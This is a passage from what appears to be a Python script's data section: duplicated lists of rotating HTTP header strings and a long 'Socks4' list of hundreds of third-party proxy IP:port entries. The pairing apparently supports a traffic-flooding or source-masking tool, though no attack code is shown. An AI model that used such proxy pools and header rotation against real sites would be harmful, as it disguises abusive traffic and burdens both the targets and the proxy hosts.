     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xhtml+xml',
     'Accept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept-Encoding: gzip, deflate\r\n',
    'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
    'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
    'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xhtml+xml',
    'Accept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
    'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
]
Socks4 = ["""172.245.159.177:80
45.128.133.1:1080
192.252.214.20:15864
209.97.150.167:3128
88.51.214.182:80
192.111.135.17:18302
154.6.96.46:3128
154.6.97.153:3128
154.6.97.185:3128
38.62.221.141:3128
154.6.98.143:3128
154.6.96.80:3128
154.6.96.201:3128
154.6.98.204:3128
38.62.221.230:3128
154.6.96.174:3128
154.6.96.19:3128
38.62.220.170:3128
38.62.222.26:3128
38.62.223.80:3128
154.6.98.8:3128
154.6.98.116:3128
154.6.97.189:3128
38.62.221.119:3128
154.6.99.89:3128
154.6.97.9:3128
154.6.97.107:3128
154.6.98.29:3128
38.62.222.23:3128
38.62.220.31:3128
38.62.223.120:3128
154.6.96.108:3128
38.62.221.137:3128
38.62.221.202:3128
154.6.99.187:3128
154.6.98.26:3128
154.6.96.14:3128
154.6.99.235:3128
38.62.221.118:3128
38.62.221.30:3128
154.6.97.225:3128
38.62.222.181:3128
154.6.96.33:3128
38.62.220.16:3128
38.62.220.254:3128
154.6.97.101:3128
38.62.220.237:3128
154.6.96.145:3128
38.62.222.37:3128
154.6.97.77:3128
154.6.96.38:3128
154.6.97.207:3128
38.62.222.0:3128
154.6.99.229:3128
38.62.223.253:3128
154.6.98.137:3128
154.6.99.78:3128
38.62.221.24:3128
154.6.96.44:3128
154.6.97.224:3128
38.62.221.12:3128
154.6.99.100:3128
38.62.221.68:3128
154.6.99.20:3128
38.62.223.239:3128
38.62.220.128:3128
38.62.221.115:3128
154.6.99.132:3128
38.62.221.113:3128
154.6.97.116:3128
38.62.221.194:3128
154.6.96.208:3128
38.62.220.100:3128
38.62.220.149:3128
154.6.98.240:3128
38.62.220.85:3128
154.6.96.250:3128
154.6.96.39:3128
154.6.98.30:3128
154.6.98.141:3128
154.6.96.79:3128
38.62.222.103:3128
154.6.98.19:3128
38.62.223.147:3128
38.62.223.77:3128
38.62.221.47:3128
38.62.221.122:3128
154.6.97.7:3128
154.6.99.61:3128
154.6.96.121:3128
38.62.223.213:3128
38.62.221.29:3128
154.6.99.154:3128
38.62.221.50:3128
38.62.220.187:3128
38.62.223.114:3128
38.62.220.245:3128
154.6.96.150:3128
154.6.98.17:3128
38.62.221.234:3128
38.62.223.141:3128
38.62.222.12:3128
154.6.96.56:3128
38.62.222.234:3128
38.62.220.124:3128
38.62.220.161:3128
72.206.181.97:64943
98.162.25.29:31679
96.36.50.99:39593
103.63.190.37:8080
77.78.210.218:8080
95.188.82.147:3629
115.127.31.66:8080
5.189.184.147:36132
141.94.174.6:49675
141.94.174.6:35557
207.244.252.14:53504
201.174.239.29:4153
110.12.211.140:80
221.151.181.101:8000
67.43.236.20:21975
152.32.132.220:443
72.10.164.178:23851
223.113.80.158:9091
120.197.40.219:9002
182.52.108.58:3629
110.34.3.229:3128
51.210.45.148:11176
91.200.114.58:55749
92.205.61.38:64378
166.62.36.126:45982
5.161.98.204:11232
192.252.216.81:4145
97.74.229.3:45644
72.217.216.239:4145
162.243.140.82:5968
144.76.96.180:5566
166.62.35.102:45775
207.180.222.186:10640
213.136.93.115:2948
162.241.79.22:45034
120.26.0.11:8880
45.189.151.17:8080
92.205.105.119:39555
192.252.216.81:4145
142.54.237.34:4145
213.251.185.168:45727
184.178.172.5:15303
45.81.232.17:30971
47.56.110.204:8989
107.172.157.151:59627
184.178.172.17:4145
45.11.95.165:5020
92.205.108.94:63840
154.118.228.212:80
135.125.9.103:30409
91.134.140.160:20896
117.160.250.132:8899
198.12.255.193:10729
179.1.110.87:5678
213.251.185.168:36560
141.94.174.6:15952
69.167.169.46:51444
72.10.164.178:13075
79.137.198.31:33017
141.94.174.6:45620
107.180.88.195:45439
185.67.2.63:5566
213.251.185.168:17428
72.195.34.59:4145
137.184.1.49:23787
72.195.114.184:4145
198.49.68.80:80
144.76.96.180:5566
184.178.172.14:4145
61.130.9.38:443
162.214.102.121:54746
107.180.92.72:37790
94.23.220.136:59415
161.97.170.209:15900
212.108.134.10:9090
51.210.216.54:80
137.184.1.49:49842
62.33.207.202:3128
148.72.40.123:45315
162.214.164.200:50924
107.181.161.81:4145
51.210.4.123:52614
45.91.93.166:16496
92.205.108.94:28976
92.205.61.38:18841
94.131.107.45:1080
45.11.95.165:6005
144.91.66.30:32939
148.72.212.198:61702
142.54.236.97:4145
169.53.22.19:3128
38.242.251.177:54964
221.6.139.190:9002
188.164.197.75:59508
79.137.198.31:32155
159.69.153.169:5566
98.103.88.158:46104
5.42.84.36:40000
162.214.227.68:31162
74.119.144.60:4145
88.198.49.189:4859
194.233.78.142:39833
167.99.39.82:28140
171.243.26.172:40166
182.106.220.252:9091
178.128.156.219:8000
128.199.5.121:28067
174.64.199.79:4145
178.33.167.180:57185
45.81.232.17:58818
159.223.71.71:49922
170.187.150.68:47794
104.36.166.42:59377
192.111.135.18:18301
141.94.174.6:15952
208.87.131.151:20971
188.164.197.178:15963
68.71.249.153:48606
109.123.254.43:46632
92.205.61.38:61462
49.50.69.233:45535
51.210.45.148:36721
167.99.39.82:28140
123.49.53.170:5678
92.205.105.189:25218
5.161.98.204:58199
79.137.32.83:19712
173.212.237.43:53585
46.38.230.49:51566
161.97.143.60:49340
92.204.134.38:15393
130.255.162.199:41581
51.210.4.123:61802
213.57.128.161:80
102.132.55.144:8080
162.241.45.22:38076
5.39.69.35:7798
167.172.86.46:10471
5.161.98.204:37901
158.69.55.204:50248
186.103.133.91:5678
141.94.174.6:6438
54.39.50.68:14531
190.115.215.65:8081
79.143.187.58:38971
139.99.148.90:3128
18.170.113.254:15194
89.40.227.114:57176
192.111.139.163:19404
43.155.146.168:15673
92.255.164.166:4145
78.141.238.119:57614
132.148.154.97:38315
146.59.202.70:80
54.36.108.149:57959
167.99.123.158:52415
207.180.234.220:47348
213.251.185.168:36978
172.93.110.144:51611
198.12.255.193:34616
162.55.95.91:8093
38.50.130.93:5678
45.167.124.30:999
51.255.79.92:38102
91.134.140.160:32896
162.215.15.69:54511
67.43.228.253:20583
159.89.238.24:8000
51.89.173.40:26545
103.216.49.56:8080
49.235.127.178:8000
79.137.32.83:62629
207.180.222.186:20255
185.23.118.97:51923
147.135.129.229:45917
64.92.125.145:49603
51.158.64.130:16379
148.72.215.230:13436
117.160.250.131:80
104.248.151.220:59755
213.136.78.200:58530
104.238.111.107:5452
72.37.217.3:4145
41.65.55.10:1981
198.12.255.193:13531
45.11.95.165:5031
184.170.249.65:4145
207.180.198.241:45718
203.89.8.107:80
185.132.242.212:8083
149.28.72.138:8888
91.134.140.160:27207
184.181.217.210:4145
188.164.197.178:17868
221.194.149.8:80
92.205.129.134:21683
104.37.135.145:4145
162.55.95.91:4949
51.210.45.148:9351
166.62.122.168:56059
54.38.179.162:17322
155.138.208.41:32000
193.122.124.231:2335
172.235.1.113:80
91.134.140.160:8879
37.187.135.60:1691
165.227.196.37:62640
173.212.240.168:61170
161.156.199.78:80
198.27.82.143:36965
27.147.217.246:8080
153.19.91.77:80
120.194.4.157:82
5.42.74.255:33595
190.195.225.34:80
45.11.95.165:5004
174.64.199.79:4145
89.218.8.152:3128
161.97.170.209:33753
79.137.32.83:55354
108.170.12.10:80
117.69.237.59:8089
72.10.164.178:22035
103.13.112.8:48605
195.35.3.117:80
190.152.104.2:35010
121.128.194.154:80
120.234.203.171:9002
92.205.108.112:60441
23.94.214.8:9054
184.181.217.206:4145
173.249.33.122:49851
167.172.238.15:10002
5.252.23.249:1080
114.30.79.165:3128
66.228.40.212:32027
176.197.103.58:4145
192.111.130.5:17002
161.97.160.158:27010
62.171.131.101:63551
45.11.95.165:5036
51.255.79.114:10337
162.214.102.121:23728
198.27.82.143:26269
45.187.71.208:5678
119.148.14.161:9990
194.31.79.75:11773
181.48.193.42:2580
94.130.21.228:22122
45.184.155.5:999
45.81.232.17:1426
51.255.79.114:31698
172.104.154.229:34452
181.204.156.66:5678
128.199.183.41:54603
104.238.111.107:5484
167.71.226.13:1567
208.79.11.97:9080
162.55.95.91:15952
194.31.79.75:19767
45.81.232.17:24187
171.244.10.204:43012
104.238.111.107:30026
92.205.129.134:60619
141.94.174.6:54748
135.181.30.244:57849
103.105.228.66:8080
185.129.250.75:62088
67.43.227.227:10635
168.119.119.45:8443
130.255.162.199:41581
2.57.131.19:4145
168.119.119.45:8443
123.182.58.240:8089
162.55.95.91:59772
8.142.3.145:3306
141.94.174.6:54748
103.169.255.196:8061
217.13.111.11:80
60.217.64.237:35292
165.22.77.69:35964
72.10.160.174:12807
104.238.111.107:53777
161.97.170.209:55878
109.123.254.43:23901
184.181.217.213:4145
198.199.115.151:35792
51.79.229.230:23616
5.189.184.147:27191
117.69.232.248:8089
74.119.147.209:4145
163.172.131.178:16379
200.229.27.149:1614
139.198.120.15:29527
45.4.202.73:999
94.23.220.136:25256
132.148.154.97:43031
165.227.196.37:50275
159.203.137.249:60565
92.205.61.38:59546
103.6.177.174:8002
171.244.140.160:56773
161.132.172.24:999
194.233.79.104:59072
183.230.162.122:9091
117.74.65.29:9991
198.12.251.108:39517
109.238.12.156:29834
67.43.227.227:17797
45.234.60.128:999
103.49.202.250:80
36.66.110.210:8080
184.178.172.28:15294
60.214.128.150:9091
141.94.174.6:13718
171.248.208.57:1080
144.91.115.113:33941
103.255.145.62:84
164.92.237.188:62098
72.167.220.208:17799
51.38.63.124:23778
103.11.134.46:38730
223.247.47.132:8089
92.205.108.94:63840
72.10.160.170:2317
46.182.6.69:13566
161.97.115.244:55683
171.244.140.160:55039
166.62.38.100:35559
51.210.4.123:55774
1.0.240.183:8080
217.182.210.152:80
8.209.255.13:3128
162.241.115.85:54159
109.68.189.22:54643
208.102.51.6:58208
152.228.140.225:60387
173.249.33.122:5640
51.38.27.158:8813
103.154.77.79:8080
178.54.21.203:8081
207.180.222.186:9759
139.255.94.123:39635
103.83.0.46:8080
72.210.221.197:4145
78.28.152.78:80
163.47.210.74:8080
172.93.110.156:32268
51.15.242.202:8888
117.160.250.133:8899
197.251.209.34:82
103.105.126.2:83
85.172.0.30:8080
92.205.61.38:17586
103.118.44.27:8080
196.1.95.124:80
113.252.40.144:8193
186.103.203.206:999
171.233.176.143:1080
207.180.241.82:55180
165.22.98.229:44277
171.254.217.21:1080
192.111.135.18:18301
164.215.123.94:4145
162.144.36.208:27531
198.11.175.180:999
38.242.143.44:9840
106.105.218.244:80
39.165.0.137:9002
79.137.32.83:18568
72.10.160.171:9063
47.254.47.61:1337
165.16.27.42:1981
213.136.93.115:28718
162.248.224.103:80
103.83.36.1:5678
188.95.20.138:5678
67.43.227.227:29685
103.152.112.167:80
195.114.209.50:80
67.43.236.20:11745
96.126.120.82:40391
67.43.236.20:17249
67.43.227.228:17413
47.92.248.197:30001
192.252.211.197:14921
47.114.101.57:8888
62.171.131.101:13819
165.16.6.153:1981
47.109.57.93:8080
162.214.188.67:43430
190.61.55.138:999
117.160.250.138:8899
103.58.4.62:4153
109.160.97.49:4145
2.188.164.194:8080
93.190.142.57:31243
158.69.219.67:45797
117.74.65.207:54877
139.99.148.90:3128
72.10.160.94:8061
188.165.226.128:59307
103.105.228.168:8080
67.43.227.227:23047
171.247.242.47:1080
109.238.11.197:9762
213.136.78.200:51240
159.203.127.164:41662
222.173.52.164:8089
47.92.248.197:19
103.92.235.75:45320
47.92.248.197:8002
130.162.224.168:1080
98.181.137.83:4145
184.178.172.5:15303
116.118.98.26:5678
198.11.175.180:4145
196.41.47.218:4145
194.124.37.8:8080
167.172.100.244:11562
47.109.57.93:8009
207.180.221.129:55690
72.10.173.196:8089
45.81.232.17:64824
212.103.118.77:5678
188.43.228.25:8080
198.11.175.180:9002
182.53.216.4:4153
109.87.130.6:5678
101.200.187.233:10001
8.130.39.155:3389
87.117.11.57:1080
8.209.253.237:16894
162.243.140.82:18782
98.178.72.21:10919
47.91.45.235:8090
123.138.24.106:11066
148.72.209.174:31352
189.240.60.166:9090
46.101.198.43:55336
67.43.236.20:29755
64.20.62.75:51771
8.209.253.237:999
113.161.131.43:80
161.97.163.52:1576
134.209.29.120:3128
146.59.70.29:30439
67.43.227.227:18965
198.12.252.88:54384
95.79.121.193:38080
178.128.113.118:23128
72.195.114.184:4145
142.4.7.20:61323
106.105.120.14:80
165.227.120.250:10000
213.160.71.178:21879
134.209.29.120:8080
110.77.232.27:4145
105.112.95.133:8080
188.87.137.45:3128
213.251.185.168:62208
120.42.35.92:35010
217.69.195.134:38080
198.37.57.112:80
2.189.59.7:80
117.69.236.68:8089
148.72.209.174:7934
109.228.53.126:54547
145.239.2.102:29457
64.225.8.132:10001
107.180.89.55:60756
148.72.213.202:46569
103.139.243.89:82
8.209.253.237:805
49.0.250.196:999
117.74.65.207:50468
117.213.45.224:8080
72.10.164.178:14147
67.205.177.122:21381
47.109.56.77:6666
139.155.73.252:3128
93.116.57.4:4153
38.242.238.254:43113
68.71.249.153:48606
181.10.117.254:999
8.209.253.237:18081
66.42.224.229:41679
35.244.134.140:3389
88.79.243.103:3128
67.43.228.253:31133
173.212.219.228:80
184.181.217.194:4145
117.74.65.207:53446
213.91.232.94:8080
129.150.39.9:80
115.85.84.163:5678
103.57.222.220:36052
8.209.253.237:4006
103.139.242.1:82
36.64.132.91:3127
72.10.160.90:6495
61.129.2.212:8080
192.252.214.20:15864
79.137.199.255:1234
172.96.140.93:4731
89.171.116.65:65000
142.54.237.34:4145
139.129.162.65:3128
123.138.24.108:10976
195.181.172.231:8080
161.97.173.42:64165
222.124.193.114:8080
45.228.192.107:3141
222.124.193.118:8080
49.0.250.196:18081
112.78.170.251:8080
128.199.234.135:52845
72.10.164.178:17587
72.10.164.178:16655
138.68.60.8:8080
72.10.173.196:8181
64.189.106.6:3129
192.111.129.145:16894
141.145.214.176:80
58.234.116.197:80
203.150.172.151:8080
65.49.82.7:55367
223.16.92.17:80
58.22.60.174:1080
39.107.33.254:8090
103.156.140.249:8086
177.230.144.185:10101
185.101.16.52:80
87.255.9.123:8443
46.35.9.110:80
162.214.170.144:56937
68.183.144.115:10003
194.150.255.207:3128
192.69.61.250:16099
181.209.78.78:999
207.180.222.186:17040
36.91.98.115:8181
213.6.38.50:59422
168.90.14.178:999
74.119.144.60:4145
181.13.198.90:4153
103.10.120.165:80
117.74.65.207:54466
183.56.243.209:1080
196.20.125.129:8083
103.118.46.177:8080
45.91.92.45:35154
103.148.72.147:57305
147.135.129.229:17733
142.54.232.6:4145
67.43.236.20:2615
212.83.143.118:10713
192.111.137.35:4145
173.249.31.25:39256
108.181.23.18:46741
184.181.217.201:4145
67.201.33.10:25283
184.58.32.195:80
45.6.15.67:5678
104.219.234.42:10010
222.174.178.122:4999
36.64.238.82:1080
198.27.82.143:35425
60.217.64.237:35292
68.71.249.153:48606
190.97.238.92:999
181.78.105.152:999
68.71.254.6:4145
107.181.168.145:4145
161.97.115.244:26796
117.160.250.131:80
91.230.65.107:38080
167.88.186.219:23676
198.12.253.60:24497
57.129.35.97:3128
162.214.163.137:28045
104.248.29.72:4555
38.242.238.254:8130
91.230.154.149:38080
170.246.85.107:50991
2.189.59.4:80
8.243.169.11:8080
49.231.0.178:58023
67.43.236.20:31873
184.181.217.220:4145
2.189.59.3:80
192.144.30.200:8080
49.0.250.196:8002
167.114.96.27:9300
216.137.177.251:13552
213.251.184.173:14103
213.171.44.82:3629
114.32.21.74:8088
207.180.222.186:37871
98.170.57.249:4145
72.210.221.197:4145
97.129.14.131:80
95.178.108.189:5678
98.188.47.132:4145
192.111.135.18:18301
111.59.4.88:9002
103.185.111.29:5678
72.10.164.178:16455
222.104.128.205:48678
59.126.92.130:33333
72.10.160.90:5457
189.240.60.164:9090
139.162.166.167:46795
117.74.65.207:39732
199.58.185.9:4145
91.107.127.18:62521
45.91.93.166:33725
137.184.1.49:24085
103.57.222.220:38097
181.37.240.89:999
83.220.168.57:10103
80.106.247.145:5678
67.43.236.20:25283
148.72.211.168:57302
62.171.131.101:33888
12.186.205.123:80
51.38.49.98:22852
192.163.200.200:60205
5.189.184.147:52711
212.57.42.88:4153
45.65.138.48:999
184.181.217.194:4145
221.194.149.8:80
162.243.140.82:39009
104.238.111.107:23667
192.169.226.96:43328
123.231.230.58:39365
190.238.231.44:1994
185.44.232.30:53281
162.223.116.75:80
213.52.130.61:34084
200.111.249.197:999
72.10.160.90:11575
72.217.158.202:4145
183.88.219.206:34676
184.181.217.220:4145
92.205.61.38:26750
59.6.26.121:80
162.214.165.6:50972
103.147.128.65:84
42.96.42.13:8080
67.43.227.227:2049
184.107.90.22:3128
83.218.186.22:5678
167.99.123.158:38263
91.150.77.58:54037
157.245.46.100:31280
66.70.235.23:5454
67.43.227.227:17883
47.109.52.147:8001
24.173.4.70:16099
154.73.108.206:1981
125.65.40.199:12345
67.43.227.227:6239
41.159.154.43:3128
183.234.215.11:8443
113.208.119.142:9002
103.148.77.156:14101
211.43.214.205:80
64.202.186.2:21602
63.250.52.82:8118
85.172.5.74:3629
46.161.194.65:1976
188.165.239.102:34592
47.109.56.77:100
92.205.61.38:26750
107.181.168.145:4145
54.36.108.149:14982
62.210.119.138:3128
67.43.227.227:1985
216.238.80.3:58061
43.138.20.156:80
38.7.2.98:1080
168.119.89.217:20147
67.43.227.227:25359
162.240.16.171:40456
222.64.56.243:5678
109.205.181.27:2050
185.134.233.153:38080
15.235.87.181:45168
88.255.217.35:8080
106.14.243.103:50129
207.180.235.153:13715
184.181.217.201:4145
79.137.199.255:8888
141.94.174.6:13326
103.84.56.83:8080
192.252.208.67:14287
187.21.129.2:8080
8.213.129.15:1081
207.180.222.186:17182
199.58.184.97:4145
190.188.244.84:5678
5.189.172.158:3128
85.237.62.189:3629
153.101.67.170:9002
38.156.73.149:8080
138.121.160.152:1978
117.74.65.29:3129
141.94.174.6:38428
103.178.194.243:2016
168.90.14.171:999
67.43.236.20:17739
123.138.24.107:10492
212.108.134.10:9090
98.162.25.29:31679
109.123.253.20:57906
66.33.199.118:33515
104.238.111.107:37963
141.95.160.178:1354
109.123.253.20:53629
176.100.200.229:80
139.162.251.56:56035
107.152.98.5:4145
24.249.199.12:4145
67.43.236.20:1031
92.204.134.38:11031
199.102.107.145:4145
67.201.59.70:4145
142.54.229.249:4145
50.63.13.3:11544
92.205.108.61:53346
72.10.164.178:20803
103.36.35.135:8080
45.87.68.9:15321
47.109.56.77:8084
188.0.191.104:3128
117.74.65.29:20002
47.88.29.108:8499
77.92.245.34:8080
144.202.45.78:5926
200.60.41.164:999
98.162.25.4:31654
47.88.29.108:18081
189.240.60.171:9090
202.70.145.26:4995
117.74.65.207:54877
66.94.118.230:16257
72.167.54.228:42236
125.229.149.169:65110
189.201.191.65:4145
117.250.3.58:8080
159.69.153.169:5566
162.240.74.107:32717
213.52.130.61:34084
51.75.126.150:24021
47.88.29.108:6666
47.88.29.108:5678
54.36.108.149:32731
222.138.76.6:9002
175.118.126.11:3128
107.181.161.81:4145
210.57.211.7:8080
128.199.234.135:52845
193.70.114.57:12542
45.4.144.105:4153
72.10.160.174:2481
186.97.172.178:60080
67.43.236.20:28887
203.89.8.107:80
45.61.188.134:44499
173.212.245.45:59589
123.138.24.103:11207
138.121.15.227:999
207.180.234.220:48449
178.72.89.106:8080
45.167.124.30:999
43.252.74.202:1080
109.205.181.27:27223
185.203.238.204:8080
188.95.20.139:5678
195.242.102.133:60236
104.236.0.129:61469
178.128.86.128:54562
199.187.210.54:4145
194.163.174.166:8203
185.171.24.5:25412
185.177.158.174:3128
160.248.80.91:22
37.187.91.192:27898
201.157.61.166:999
37.210.34.236:8080
184.181.217.206:4145
117.74.65.207:51200
66.60.150.190:80
220.248.70.237:9002
103.92.235.75:45320
94.228.204.225:41890
103.186.35.126:8080
72.10.160.170:13991
144.202.45.78:5926
5.252.23.206:3128
184.178.172.25:15291
141.94.174.6:3601
128.199.183.41:21961
49.0.252.39:8082
60.246.162.21:80
49.0.252.39:8888
51.89.21.99:51360
103.24.124.94:83
166.62.35.102:45775
49.0.252.39:82
173.249.56.32:25492
51.75.126.150:15920
49.0.252.39:08
105.214.53.10:5678
185.129.250.75:35132
123.138.24.106:10445
98.181.137.80:4145
152.228.218.210:59561
207.180.222.186:11191
46.209.115.130:2022
47.96.70.163:19
43.251.132.133:8080
117.74.65.207:53446
185.231.115.83:34352
49.0.252.39:8084
123.138.24.106:10009
184.168.121.153:29782
162.210.192.135:44139
72.206.181.103:4145
67.43.236.20:5851
46.47.197.210:3128
67.43.236.20:27269
49.0.252.39:4006
67.43.227.227:16645
51.75.194.213:59590
159.192.121.240:4145
117.160.250.133:8899
207.180.222.186:57599
72.10.160.90:3145
165.227.196.37:55455
178.140.177.145:8889
103.101.82.198:8080
5.189.184.147:18628
195.174.142.76:8080
182.92.73.106:80
178.128.82.105:10938
115.147.26.219:8082
67.43.227.226:31949
184.178.172.17:4145
171.244.139.185:39453
103.154.118.154:17378
95.70.220.173:4153
49.12.79.129:1924
135.181.221.83:3128
104.219.234.42:10105
128.140.63.121:37696
49.0.252.39:7777
72.10.173.196:8067
72.10.164.178:9701
51.195.137.62:4404
195.181.172.211:8082
216.238.79.4:6352
192.3.194.189:80
31.156.152.46:80
161.49.90.70:1337
98.162.25.23:4145
184.178.172.26:4145
118.193.39.206:3128
184.170.249.65:4145
103.176.45.227:3128
109.236.44.181:8080
103.151.20.131:80
51.255.79.114:50574
104.248.151.220:60915
47.100.91.57:8080
67.43.227.227:22721
38.52.222.154:999
67.43.236.20:2977
67.43.227.227:1863
47.96.70.163:8090
98.162.25.23:4145
222.243.201.153:9992
162.248.225.230:80
162.144.36.208:38242
54.37.75.103:44699
89.28.32.203:57391
147.135.129.229:40539
198.12.253.239:19390
54.36.108.149:57269
58.20.248.139:9002
62.3.30.70:8080
192.252.209.155:14455
112.53.184.170:9091
113.143.37.82:9002
192.252.216.81:4145
67.43.228.253:9679
195.181.172.230:8082
95.163.84.93:10333
117.74.65.207:39732
47.253.105.175:999
91.185.38.105:7050
190.97.238.90:999
162.241.115.85:54159
141.94.174.6:46774
207.180.222.186:24764
178.33.142.54:30000
84.46.250.207:5755
208.102.51.6:58208
47.91.95.174:3127
103.162.31.103:20056
188.164.196.31:52359
62.109.15.27:3120
185.198.2.113:11223
123.108.92.70:8082
41.254.48.10:1981
98.162.25.4:31654
209.159.153.21:50104
51.79.87.144:41230
111.20.217.178:9091
213.136.78.200:18682
217.79.178.47:17684
123.138.24.108:11589
129.146.45.163:31289
72.217.216.239:4145
94.253.12.36:8080
12.68.66.209:16099
121.58.235.10:8091
117.74.65.207:514
173.212.240.168:29313
47.254.153.78:20
172.93.111.235:43089
67.43.227.227:9715
103.76.12.42:80
47.253.105.175:1025
138.197.10.76:15908
169.53.22.19:3128
67.43.228.253:18277
92.205.108.61:3783
148.72.211.168:64330
67.43.236.20:9021
209.14.112.7:1080
148.72.212.198:59930
94.43.164.242:8080
67.43.236.20:28229
184.181.217.213:4145
67.43.227.227:12207
182.160.100.156:5020
178.207.11.148:3129
12.186.205.121:80
207.180.198.241:52415
185.217.143.96:80
213.212.220.210:8080
47.254.153.78:8888
47.254.153.78:8084
122.248.46.26:4145
72.206.181.103:4145
207.180.222.186:40169
218.65.6.150:3128
51.210.45.148:3865
181.176.20.103:999
164.68.107.40:25427
45.128.133.241:1080
184.185.2.12:4145
213.32.66.64:56637
92.204.135.4:38114
119.82.251.250:31678
190.144.80.122:8080
141.95.160.178:11925
184.178.172.3:4145
108.181.23.22:46741
72.10.164.178:11399
72.10.173.195:8089
220.152.112.150:1088
123.138.24.106:10845
166.62.41.113:40204
184.178.172.5:15303
72.10.160.90:13643
87.238.192.249:50153
36.92.170.19:8080
173.208.223.139:4128
190.144.238.66:8080
98.170.57.231:4145
73.199.175.96:80
72.217.216.239:4145
109.205.181.27:28627
8.213.137.155:443
8.208.90.243:80
189.195.176.99:5678
162.240.16.171:47859
213.14.31.123:35314
67.43.236.20:9827
203.96.177.211:51877
144.217.254.45:63720
183.88.194.144:8080
79.110.112.241:8080
128.199.234.135:32637
45.61.188.134:44499
103.148.192.82:9012
82.103.70.227:4145
68.1.210.163:4145
141.94.174.6:37057
162.215.223.71:31396
51.75.121.63:49314
178.169.139.180:8080
47.89.184.18:3128
138.68.60.8:3128
125.26.183.79:8080
182.76.169.38:2245
161.97.147.193:20902
47.243.114.192:8180
203.73.62.104:60808
8.212.23.2:80
103.118.46.12:32650
67.43.236.20:27199
191.7.212.84:8080
103.14.97.203:22147
103.161.30.65:82
72.37.216.68:4145
36.64.36.171:5678
207.180.222.186:11191
118.97.47.249:55443
67.43.227.228:21621
110.238.111.229:8085
45.91.93.166:11889
192.111.139.165:4145
216.137.177.251:29465
51.255.79.114:50574
46.30.42.234:23924
72.206.181.123:4145
186.215.87.194:6029
67.43.236.22:21725
117.74.65.207:54466
176.77.9.22:5678
116.68.196.237:9990
187.102.78.181:4145
154.113.86.209:5678
2.189.59.6:80
103.159.47.42:82
104.219.234.42:10105
87.129.166.186:8080
171.233.143.177:5217
51.75.126.150:7783
104.236.114.255:24177
85.239.233.200:25580
115.96.208.124:8080
107.180.88.173:9562
49.12.126.53:20622
147.135.128.111:36700
45.11.95.166:6015
207.180.222.186:63961
144.91.66.30:25597
141.94.174.6:24085
162.243.184.21:10007
195.250.39.34:7269
47.89.240.232:56682
23.26.217.12:32573
114.156.77.107:8080
92.205.60.110:27084
51.38.241.250:54321
72.10.160.173:13403
94.154.152.2:8079
38.242.143.44:57954
198.49.68.80:80
184.170.248.5:4145
67.43.227.227:9393
184.185.2.12:4145
185.23.118.97:54902
45.65.137.218:999
110.238.111.229:8002
184.178.172.28:15294
185.129.250.75:22933
54.38.192.5:3838
95.217.119.91:58552
189.240.60.169:9090
190.94.212.149:999
105.27.195.194:9812
128.199.202.122:3128
103.213.97.74:80
79.137.34.146:12059
43.250.107.223:80
103.96.146.122:3128
213.160.71.182:62558
181.232.190.118:999
67.43.227.227:26261
46.101.186.238:80
117.160.250.130:8899
194.9.62.141:80
202.12.80.158:83
235.252.96.137:80
36.88.129.141:7777
36.134.91.82:8888
54.36.108.149:24335
118.99.73.186:8080
195.181.172.211:8081
139.59.1.14:3128
41.207.249.166:8080
164.132.170.100:80
